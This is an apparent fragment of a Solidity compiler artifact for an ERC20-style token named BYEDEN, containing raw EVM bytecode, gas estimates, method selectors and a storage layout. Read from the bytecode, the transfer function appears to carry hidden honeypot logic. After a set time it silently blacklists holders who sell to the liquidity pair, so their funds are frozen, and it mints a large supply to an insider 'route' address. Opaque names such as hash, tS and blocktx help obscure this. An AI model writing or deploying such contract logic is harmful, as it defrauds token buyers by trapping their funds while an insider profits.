0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20696E73756666696369656E7420616C6C6F77616E6365000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x48B JUMP JUMPDEST PUSH2 0x6AA DUP5 DUP5 DUP5 DUP5 SUB PUSH2 0x551 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x6D6 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x48B SWAP1 PUSH2 0xCB4 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x6FC JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x48B SWAP1 PUSH2 0xCF9 JUMP JUMPDEST PUSH2 0x707 DUP4 DUP4 DUP4 PUSH2 0x7B7 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0xC SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x411 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x48B JUMP JUMPDEST PUSH1 0xC DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT DUP4 AND DUP2 OR SWAP1 SWAP4 SSTORE PUSH1 0x40 MLOAD SWAP2 AND SWAP2 SWAP1 DUP3 SWAP1 PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 SWAP1 PUSH0 SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x7DD JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x48B SWAP1 PUSH2 0xCB4 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x803 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x48B SWAP1 PUSH2 0xCF9 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x826 DUP5 DUP5 DUP5 PUSH2 0x8F1 JUMP JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x885 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220616D6F756E7420657863656564732062 PUSH1 0x44 DUP3 ADD MSTORE PUSH6 0x616C616E6365 PUSH1 0xD0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x48B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 DUP7 DUP7 SUB SWAP1 SSTORE SWAP3 DUP7 AND DUP1 DUP3 MSTORE SWAP1 DUP4 SWAP1 KECCAK256 DUP1 SLOAD DUP7 ADD SWAP1 SSTORE SWAP2 MLOAD PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP1 PUSH2 0x8E4 SWAP1 DUP7 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH2 0x6AA JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x8 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH1 0xFF AND ISZERO PUSH2 0x929 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x48B SWAP1 PUSH2 0xC70 JUMP JUMPDEST PUSH2 0x708 PUSH1 0xA SLOAD TIMESTAMP PUSH2 0x93A SWAP2 SWAP1 PUSH2 0xD3C JUMP JUMPDEST GT ISZERO PUSH2 0x976 JUMPI PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0xA0 SHL SWAP1 DIV PUSH1 0xFF AND PUSH2 0x976 JUMPI PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH2 0x976 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH2 0x971 SWAP1 PUSH2 0x3E8 PUSH2 0xD4F JUMP JUMPDEST PUSH2 0xA39 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND SWAP2 AND EQ DUP1 ISZERO PUSH2 0x9A1 JUMPI POP PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND SWAP2 AND EQ ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x9BB JUMPI POP PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND SWAP2 AND EQ ISZERO JUMPDEST ISZERO PUSH2 0x707 JUMPI PUSH2 0x384 PUSH1 0xA SLOAD TIMESTAMP PUSH2 0x9D1 SWAP2 SWAP1 PUSH2 0xD3C JUMP JUMPDEST GT ISZERO PUSH2 0x707 JUMPI PUSH2 0x3E8 PUSH1 0xB SLOAD PUSH1 0x1 PUSH2 0x9E9 SWAP2 SWAP1 PUSH2 0xD4F JUMP JUMPDEST PUSH2 0x9F3 SWAP2 SWAP1 PUSH2 0xD66 JUMP JUMPDEST DUP2 GT ISZERO PUSH2 0xA12 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x48B SWAP1 PUSH2 0xC70 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x8 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 DUP1 SLOAD PUSH1 0xFF NOT AND PUSH1 0x1 OR SWAP1 SSTORE POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0xA8F JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x48B JUMP JUMPDEST DUP1 PUSH1 0x4 PUSH0 DUP3 DUP3 SLOAD PUSH2 0xAA0 SWAP2 SWAP1 PUSH2 0xC5D JUMP JUMPDEST SWAP1 SWAP2 SSTORE POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD DUP7 ADD SWAP1 SSTORE MLOAD DUP5 DUP2 MSTORE PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 PUSH1 0x20 DUP6 ADD MSTORE PUSH0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0xB24 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0x40 ADD MSTORE DUP3 ADD PUSH2 0xB08 JUMP JUMPDEST POP PUSH0 PUSH1 0x40 DUP3 DUP7 ADD ADD MSTORE PUSH1 0x40 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP6 ADD ADD SWAP3 POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0xB5A JUMPI PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xB70 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xB79 DUP4 PUSH2 0xB44 JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xB99 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xBA2 DUP5 PUSH2 0xB44 JUMP JUMPDEST SWAP3 POP PUSH2 0xBB0 PUSH1 0x20 DUP6 ADD PUSH2 0xB44 JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xBD0 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xBD9 DUP3 PUSH2 0xB44 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xBF1 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xBFA DUP4 PUSH2 0xB44 JUMP JUMPDEST SWAP2 POP PUSH2 0xC08 PUSH1 0x20 DUP5 ADD PUSH2 0xB44 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH2 0xC25 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0xC43 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH2 0x3B6 JUMPI PUSH2 0x3B6 PUSH2 0xC49 JUMP JUMPDEST PUSH1 0x20 DUP1 DUP3 MSTORE PUSH1 0x24 SWAP1 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F76652066726F6D20746865207A65726F20616464 PUSH1 0x40 DUP3 ADD MSTORE PUSH4 0x72657373 PUSH1 0xE0 SHL PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH1 0x20 DUP1 DUP3 MSTORE PUSH1 0x25 SWAP1 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E736665722066726F6D20746865207A65726F206164 PUSH1 0x40 DUP3 ADD MSTORE PUSH5 0x6472657373 PUSH1 0xD8 SHL PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH1 0x20 DUP1 DUP3 MSTORE PUSH1 0x23 SWAP1 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220746F20746865207A65726F2061646472 PUSH1 0x40 DUP3 ADD MSTORE PUSH3 0x657373 PUSH1 0xE8 SHL PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST DUP2 DUP2 SUB DUP2 DUP2 GT ISZERO PUSH2 0x3B6 JUMPI PUSH2 0x3B6 PUSH2 0xC49 JUMP JUMPDEST DUP1 DUP3 MUL DUP2 ISZERO DUP3 DUP3 DIV DUP5 EQ OR PUSH2 0x3B6 JUMPI PUSH2 0x3B6 PUSH2 0xC49 JUMP JUMPDEST PUSH0 DUP3 PUSH2 0xD80 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST POP DIV SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4D PUSH4 0xD5AF3CDD 0xBA 0xC SWAP9 0xE 0xC4 EQ 0xDE 0xD 0xD0 PUSH22 0x8173179626214A76D5483D1A268AA95F64736F6C6343 STOP ADDMOD AND STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "703000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"LPpair()": "2402",
						"_balances(address)": "2605",
						"allowance(address,address)": "infinite",
						"approve(address,uint256)": "24647",
						"balanceOf(address)": "2645",
						"blocktx(address)": "2595",
						"decimals()": "199",
						"decreaseAllowance(address,uint256)": "27012",
						"hash()": "2394",
						"increaseAllowance(address,uint256)": "infinite",
						"name()": "infinite",
						"owner()": "2342",
						"renounceOwnership()": "infinite",
						"route()": "2358",
						"router()": "2467",
						"symbol()": "infinite",
						"tS()": "2405",
						"tStamp()": "2382",
						"totalSupply()": "2370",
						"transfer(address,uint256)": "infinite",
						"transferFrom(address,address,uint256)": "infinite",
						"transferOwnership(address)": "28443"
					},
					"internal": {
						"_transfer(address,address,uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"LPpair()": "e0bb3079",
					"_balances(address)": "6ebcf607",
					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"balanceOf(address)": "70a08231",
					"blocktx(address)": "4f9105d3",
					"decimals()": "313ce567",
					"decreaseAllowance(address,uint256)": "a457c2d7",
					"hash()": "09bd5a60",
					"increaseAllowance(address,uint256)": "39509351",
					"name()": "06fdde03",
					"owner()": "8da5cb5b",
					"renounceOwnership()": "715018a6",
					"route()": "d96661ef",
					"router()": "f887ea40",
					"symbol()": "95d89b41",
					"tS()": "d8da8560",
					"tStamp()": "eba9481d",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd",
					"transferOwnership(address)": "f2fde38b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 237,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "router",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IDEXRouter)200"
					},
					{
						"astId": 239,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "LPpair",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 243,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "_balances",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 249,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "_allowances",
						"offset": 0,
						"slot": "3",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 251,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "_totalSupply",
						"offset": 0,
						"slot": "4",
						"type": "t_uint256"
					},
					{
						"astId": 253,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "_name",
						"offset": 0,
						"slot": "5",
						"type": "t_string_storage"
					},
					{
						"astId": 255,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "_symbol",
						"offset": 0,
						"slot": "6",
						"type": "t_string_storage"
					},
					{
						"astId": 258,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "pulseV2",
						"offset": 0,
						"slot": "7",
						"type": "t_address"
					},
					{
						"astId": 392,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "blocktx",
						"offset": 0,
						"slot": "8",
						"type": "t_mapping(t_address,t_bool)"
					},
					{
						"astId": 426,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "route",
						"offset": 0,
						"slot": "9",
						"type": "t_address"
					},
					{
						"astId": 429,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "hash",
						"offset": 20,
						"slot": "9",
						"type": "t_bool"
					},
					{
						"astId": 459,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "tStamp",
						"offset": 0,
						"slot": "10",
						"type": "t_uint256"
					},
					{
						"astId": 508,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "tS",
						"offset": 0,
						"slot": "11",
						"type": "t_uint256"
					},
					{
						"astId": 24,
						"contract": "contracts/Classes/moo.sol:BYEDEN",
						"label": "_owner",
						"offset": 0,
						"slot": "12",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(IDEXRouter)200": {
						"encoding": "inplace",
						"label": "contract IDEXRouter",
						"numberOfBytes": "20"
					},
					"t_mapping(t_address,t_bool)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => bool)",
						"numberOfBytes": "32",
						"value": "t_bool"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}